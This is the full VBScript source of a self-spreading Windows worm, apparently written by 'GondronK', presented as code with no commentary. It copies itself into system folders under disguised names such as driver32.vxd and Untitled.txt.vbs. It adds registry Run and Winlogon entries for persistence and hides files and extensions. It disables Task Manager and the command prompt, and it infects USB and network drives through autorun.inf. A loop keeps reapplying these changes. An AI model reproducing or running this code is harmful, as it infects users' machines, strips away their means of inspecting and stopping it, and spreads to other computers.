On Error Resume Next 
Dim fso 
Dim wshell 
Dim skrip 
Dim windir 
Dim sysdir 
Dim fileskrip 
Dim textskrip 
Dim gondronk 
Dim getgondronk 
Dim writegondronk 
Dim flashgondronk 
Dim getflashgondronk 
Dim writeflashgondronk 
Dim sourcefile 
Dim gondronkmsg 
Dim getgondronkmsg 
Dim writegondronkmsg 
Dim sistem 
Dim rundll 
Dim rundll32 
Dim cek 
Dim fldrive 
Dim autogondronk 
Dim getautogondronk 
Dim writeautogondronk 
Dim writenetgondronk 
Dim netgondronk 
Dim getnetgondronk 
Set fso = CreateObject("scripting.filesystemobject") 
Set wshell = CreateObject("wscript.shell") 
skrip = WScript.ScriptFullname 
Set windir = fso.getspecialfolder(0) 
Set sysdir = fso.getspecialfolder(1) 
Set fileskrip = fso.getfile(skrip) 
Set textskrip = fileskrip.openastextstream(1,-2) 
Do While Not textskrip.atendofstream 
sourcefile = sourcefile & textskrip.readline 
sourcefile = sourcefile & vbcrlf 
Loop 
If fso.fileexists(sysdir & "\driver32.vxd") Then 
gondronk = sysdir & "\driver32.vxd" 
Set getgondronk = fso.getfile(gondronk) 
getgondronk.attributes=32 
Set writegondronk = fso.CreateTextFile(gondronk,2,True) 
writegondronk.write sourcefile 
writegondronk.close 
getgondronk.attributes=31 
Else 
Set writegondronk = fso.CreateTextFile(sysdir & "\driver32.vxd",2,True) 
gondronk = sysdir & "\driver32.vxd" 
Set getgondronk = fso.getfile(gondronk) 
getgondronk.attributes=32 
writegondronk.write sourcefile 
writegondronk.close 
getgondronk.attributes=31 
End If 
If fso.fileexists(windir & "\gondronk.vbs") Then 
gondronkmsg = windir & "\gondronk.vbs" 
Set getgondronkmsg = fso.getfile(gondronkmsg) 
getgondronkmsg.attributes=32 
Call pesangondronk() 
Else 
Call pesangondronk() 
gondronkmsg = windir & "\gondronk.vbs" 
Set getgondronkmsg = fso.getfile(gondronkmsg) 
End if 
Sub pesangondronk() 
Set writegondronkmsg = fso.CreateTextFile(windir & "\gondronk.vbs",2,True) 
writegondronkmsg.writeline "Rem GondronK Love You" 
writegondronkmsg.writeline "On Error Resume Next" 
writegondronkmsg.writeline "Dim fso" 
writegondronkmsg.writeline "Dim wshell" 
writegondronkmsg.writeline "Set fso = CreateObject("&Chr(34)&"scripting.filesystemobject"&Chr(34)&")" 
writegondronkmsg.writeline "Set wshell = CreateObject("&Chr(34)&"wscript.shell"&Chr(34)&")" 
writegondronkmsg.writeline "wshell.regwrite "&Chr(34)&"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\GondronK"&Chr(34)&", "&Chr(34)&"C:\WINDOWS\gondronk.vbs"&Chr(34)&"" 
writegondronkmsg.writeline "If day(now) = 22 Then" 
writegondronkmsg.writeline "wshell.Run "&Chr(34)&"notepad"&Chr(34)&",3" 
writegondronkmsg.writeline "WScript.sleep 1000" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"M"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"u"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"n"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"g"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"k"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"i"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"n"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&" "&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"K"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"a"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"m"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"u"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&" "&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"N"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"g"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"g"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"a"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"k"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&" "&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"T"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"a"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"u"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"."&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"."&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"."&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"~"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 1000" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"T"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"a"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"p"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"i"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"."&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"."&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"."&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&" "&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"D"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"i"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"s"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"a"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"a"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"t"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&" "&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"S"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"e"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"p"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"e"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"r"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"t"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"i"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&" "&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"I"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"n"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"i"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"."&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"."&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"."&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"~"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 700" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"A"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"k"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"u"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&" "&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"S"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"e"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"r"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"i"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"n"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"g"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&" "&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"I"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"n"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"g"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"a"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 300" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"t"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&" "&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"K"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"A"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"M"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"U"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"."&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"."&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"."&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"~"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 2000" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"%+{F4}"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 2000" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"~"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 2000" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"s"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"a"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"y"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"a"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"n"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 500" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"g"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 2000" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"~"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 2000" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"{LEFT}"&Chr(34)&"" 
writegondronkmsg.writeline "WScript.sleep 2000" 
writegondronkmsg.writeline "wshell.sendKeys "&Chr(34)&"~"&Chr(34)&"" 
writegondronkmsg.writeline "Else" 
writegondronkmsg.writeline "WScript.quit" 
writegondronkmsg.writeline "End If" 
writegondronkmsg.writeline "Rem Seandainya Kau Tau Betapa Aku Cinta Padamu... (GondronK Love Rara, Yogyakarta, August 29 2002, By GondronK)" 
writegondronkmsg.writeline "Rem Yogyakarta, June 22 2007" 
writegondronkmsg.writeline "Rem By Arie GondronK" 
writegondronkmsg.close 
End Sub 
If fso.fileexists(windir & "\wscript.exe") Then 
sistem = 1 
rundll = windir & "\wscript.exe" 
rundll32 = sysdir & "\rundll.exe" 
wshell.regwrite "HKEY_CLASSES_ROOT\vxdfile\Shell\Open\Command\", "C:\WINDOWS\SYSTEM\rundll.exe %1" 
fso.copyfile rundll,rundll32 
fso.copyfile rundll32,rundll 
End If 
If fso.fileexists(sysdir & "\wscript.exe") Then 
sistem = 2 
rundll = sysdir & "\wscript.exe" 
rundll32 = sysdir & "\rundll.exe" 
wshell.regwrite "HKEY_CLASSES_ROOT\vxdfile\Shell\Open\Command\", "C:\WINDOWS\SYSTEM32\rundll.exe %1" 
fso.copyfile rundll,rundll32 
fso.copyfile rundll32,rundll 
End If 
wshell.regwrite "HKEY_CLASSES_ROOT\.vxd\","vxdfile" 
wshell.regwrite "HKEY_CLASSES_ROOT\vxdfile\AlwaysShowExt", "" 
wshell.regwrite "HKEY_CLASSES_ROOT\vxdfile\EditFlags", 1, "REG_BINARY" 
wshell.regwrite "HKEY_CLASSES_ROOT\vxdfile\DefaultIcon\", "shell32.dll,-154" 
wshell.regwrite "HKEY_CLASSES_ROOT\vbsfile\DefaultIcon\", "shell32.dll,-154" 
wshell.regwrite "HKEY_CLASSES_ROOT\vbsfile\Shell\Edit\Command\", "notepad.exe" 
wshell.regwrite "HKEY_CLASSES_ROOT\vxdfile\ScriptEngine\", "VBScript" 
wshell.regwrite "HKEY_CLASSES_ROOT\vxdfile\ShellEx\PropertySheetHandlers\WSHProps\", "{60254CA5-953B-11CF-8C96-00AA00B8708C}" 
wshell.regwrite "HKEY_CLASSES_ROOT\vxdfile\ScriptHostEncode\", "{85131631-480C-11D2-B1F9-00C04F86C324}" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\SuperHidden\CheckedValue", 1, "REG_DWORD" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\SuperHidden\DefaultValue", 1, "REG_DWORD" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\SuperHidden\UncheckedValue", 1, "REG_DWORD" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\HideFileExt\CheckedValue", 1, "REG_DWORD" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\HideFileExt\DefaultValue", 1, "REG_DWORD" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\HideFileExt\UncheckedValue", 0, "REG_DWORD" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\NOHIDDEN\CheckedValue", 2, "REG_DWORD" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\NOHIDDEN\DefaultValue", 2, "REG_DWORD" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue", 1, "REG_DWORD" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\DefaultValue", 2, "REG_DWORD" 
wshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden", 2, "REG_DWORD" 
wshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt", 1, "REG_DWORD" 
wshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden", 1, "REG_DWORD" 
wshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\SuperHidden", 1, "REG_DWORD" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\gondronk", gondronkmsg 
If sistem = 1 Then 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\rundll", gondronk 
wshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled", 1, "REG_DWORD" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled", 1, "REG_DWORD" 
ElseIf sistem = 2 Then 
wshell.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell", "Explorer.exe " & gondronk 
wshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD" 
wshell.regwrite "HKEY_CURRENT_USER\Software\Policies\Microsoft\System\DisableCMD", 1, "REG_DWORD" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\System\DisableCMD", 1, "REG_DWORD" 
End If 
do 
cek = wshell.regread("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden") 
If cek <> 0 Then 
wshell.regwrite "HKEY_CLASSES_ROOT\.vxd\","vxdfile" 
wshell.regwrite "HKEY_CLASSES_ROOT\vxdfile\AlwaysShowExt", "" 
wshell.regwrite "HKEY_CLASSES_ROOT\vxdfile\EditFlags", 1, "REG_BINARY" 
wshell.regwrite "HKEY_CLASSES_ROOT\vxdfile\DefaultIcon\", "shell32.dll,-154" 
wshell.regwrite "HKEY_CLASSES_ROOT\vbsfile\DefaultIcon\", "shell32.dll,-154" 
wshell.regwrite "HKEY_CLASSES_ROOT\vbsfile\Shell\Edit\Command\", "notepad.exe" 
wshell.regwrite "HKEY_CLASSES_ROOT\vxdfile\ScriptEngine\", "VBScript" 
wshell.regwrite "HKEY_CLASSES_ROOT\vxdfile\ShellEx\PropertySheetHandlers\WSHProps\", "{60254CA5-953B-11CF-8C96-00AA00B8708C}" 
wshell.regwrite "HKEY_CLASSES_ROOT\vxdfile\ScriptHostEncode\", "{85131631-480C-11D2-B1F9-00C04F86C324}" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\SuperHidden\CheckedValue", 1, "REG_DWORD" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\SuperHidden\DefaultValue", 1, "REG_DWORD" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\SuperHidden\UncheckedValue", 1, "REG_DWORD" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\HideFileExt\CheckedValue", 1, "REG_DWORD" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\HideFileExt\DefaultValue", 1, "REG_DWORD" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\HideFileExt\UncheckedValue", 0, "REG_DWORD" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\NOHIDDEN\CheckedValue", 2, "REG_DWORD" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\NOHIDDEN\DefaultValue", 2, "REG_DWORD" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue", 1, "REG_DWORD" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\DefaultValue", 2, "REG_DWORD" 
wshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden", 2, "REG_DWORD" 
wshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt", 1, "REG_DWORD" 
wshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden", 1, "REG_DWORD" 
wshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\SuperHidden", 1, "REG_DWORD" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\gondronk", gondronkmsg 
If sistem = 1 Then 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\rundll", gondronk 
wshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled", 1, "REG_DWORD" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled", 1, "REG_DWORD" 
ElseIf sistem = 2 Then 
wshell.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell", "Explorer.exe " & gondronk 
wshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD" 
wshell.regwrite "HKEY_CURRENT_USER\Software\Policies\Microsoft\System\DisableCMD", 1, "REG_DWORD" 
wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\System\DisableCMD", 1, "REG_DWORD" 
End If 
End If 
If Not fso.fileexists(rundll32) Then 
fso.copyfile rundll,rundll32 
End If 
If Not fso.fileexists(rundll) Then 
fso.copyfile rundll32,rundll 
End If 
For Each fldrive in fso.drives 
If fldrive.drivetype = 1 And fldrive.path <> "A:" Then 
Do while fldrive.drivetype = 1 
If fso.fileexists(fldrive.path & "\usbdriver32.vbs") then 
Exit Do 
Else 
fso.copyfile rundll,fldrive.path & "\autorun.exe" 
Set writeflashgondronk = fso.CreateTextFile(fldrive.path & "\usbdriver32.vbs",2,True) 
flashgondronk = fldrive.path & "\usbdriver32.vbs" 
Set getflashgondronk = fso.getfile(flashgondronk) 
getflashgondronk.attributes = 32 
writeflashgondronk.write sourcefile 
writeflashgondronk.close 
getflashgondronk.attributes =  31 
If fso.fileexists(fldrive.path & "\autorun.inf") Then 
autogondronk = fldrive.path & "\autorun.inf" 
Set getautogondronk = fso.getfile(autogondronk) 
getautogondronk.attributes = 32 
Set writeautogondronk = fso.OpenTextFile(autogondronk,2,True) 
writeautogondronk.writeline "[autorun]" 
writeautogondronk.writeline "open=autorun.exe usbdriver32.vbs" 
writeautogondronk.writeline "shellexecute=autorun.exe usbdriver32.vbs" 
writeautogondronk.close 
Exit Do 
Else 
Set writeautogondronk = fso.OpenTextFile(fldrive.path & "\autorun.inf",2,True) 
autogondronk = fldrive.path & "\autorun.inf" 
Set getautogondronk = fso.getfile(autogondronk) 
getautogondronk.attributes = 32 
writeautogondronk.writeline "[autorun]" 
writeautogondronk.writeline "open=autorun.exe usbdriver32.vbs" 
writeautogondronk.writeline "shellexecute=autorun.exe usbdriver32.vbs" 
writeautogondronk.close 
Exit Do 
End If 
End If 
Loop 
End If 
If fldrive.drivetype = 3 Then 
Do While fldrive.drivetype = 3 
If fso.fileexists(fldrive.path & "\Untitled.txt.vbs") Then 
Exit Do 
Else 
Set writenetgondronk = fso.CreateTextFile(fldrive.path & "\Untitled.txt.vbs",2,True) 
netgondronk = fldrive.path & "\Untitled.txt.vbs" 
getnetgondronk = fso.getfile(netgondronk) 
getnetgondronk.attributes = 32 
writenetgondronk.write sourcefile 
writenetgondronk.close 
Exit Do 
End If 
Loop 
End If 
Next 
cek = "" 
Loop 
